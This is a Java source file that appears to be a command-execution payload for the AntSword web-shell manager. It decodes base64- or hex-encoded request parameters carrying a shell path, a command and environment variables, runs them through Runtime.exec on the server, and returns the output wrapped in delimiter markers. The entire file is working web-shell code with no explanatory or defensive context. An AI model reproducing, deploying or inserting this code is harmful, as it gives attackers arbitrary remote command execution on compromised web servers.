import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.jsp.PageContext;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;

public class Exec {
    public String encoder;
    public String cs;
    public String randomPrefix;

    @Override
    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        ServletRequest request = page.getRequest();
        ServletResponse response = page.getResponse();
        randomPrefix = "antswordrandomPrefix";
        encoder = "base64";
        cs = "antswordCharset";
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargbin";
        String varkey2 = "antswordargcmd";
        String varkey3 = "antswordargenv";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = EC(decode(request.getParameter(varkey1) + "", encoder, cs), encoder, cs);
            String z2 = EC(decode(request.getParameter(varkey2) + "", encoder, cs), encoder, cs);
            String z3 = EC(decode(request.getParameter(varkey3) + "", encoder, cs), encoder, cs);
            output.append(tag_s);
            sb.append(ExecuteCommandCode(z1, z2, z3, cs));
            output.append(sb.toString());
            output.append(tag_e);
            page.getOut().print(output.toString());
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        return true;
    }

    String EC(String s, String encoder, String cs) throws Exception {
        if (encoder.equals("hex") || encoder == "hex") return s;
        return new String(s.getBytes(), cs);
    }

    String decode(String str, String encode, String cs) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
            prefixlen = 0;
        }
        if (encode.equals("hex") || encode == "hex") {
            if (str == "null" || str.equals("null")) {
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2) {
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString("UTF-8");
        } else if (encode.equals("base64") || encode == "base64") {
            byte[] bt = null;
            String version = System.getProperty("java.version");
            if (version.compareTo("1.9") >= 0) {
                Class Base64 = Class.forName("java.util.Base64");
                Object Decoder = Base64.getMethod("getDecoder", new Class[0]).invoke(Base64, new  Object[]{});
                bt = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, str);   
            } else {
                Class Base64 = Class.forName("sun.misc.BASE64Decoder");
                Object Decoder = Base64.getDeclaredConstructor().newInstance();
                bt = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, str);
            }
            
            return new String(bt, "UTF-8");
        }
        return str;
    }

    String ExecuteCommandCode(String cmdPath, String command, String envstr, String cs) throws Exception {
        StringBuffer sb = new StringBuffer("");
        String[] c = {cmdPath, !isWin() ? "-c" : "/c", command};
        Map<String, String> readonlyenv = System.getenv();
        Map<String, String> cmdenv = new HashMap<>(readonlyenv);
        String[] envs = envstr.split("\\|\\|\\|asline\\|\\|\\|");
        for (int i = 0; i < envs.length; i++) {
            String[] es = envs[i].split("\\|\\|\\|askey\\|\\|\\|");
            if (es.length == 2){
                cmdenv.put(es[0], es[1]);
            }
        }
        String[] e = new String[cmdenv.size()];
        int i = 0;
        for (String key : cmdenv.keySet()) {
            e[i] = key + "=" + cmdenv.get(key);
            i++;
        }
        Process p = Runtime.getRuntime().exec(c, e);
        CopyInputStream(p.getInputStream(), sb, cs);
        CopyInputStream(p.getErrorStream(), sb, cs);
        return sb.toString();
    }

    boolean isWin() {
        String osname = (String) System.getProperty("os.name");
        osname = osname.toLowerCase();
        if (osname.startsWith("win"))
            return true;
        return false;
    }

    void CopyInputStream(InputStream is, StringBuffer sb, String cs) throws Exception {
        String l;
        BufferedReader br = new BufferedReader(new InputStreamReader(is, cs));
        while ((l = br.readLine()) != null) {
            sb.append(l + "\r\n");
        }
        br.close();
    }
}
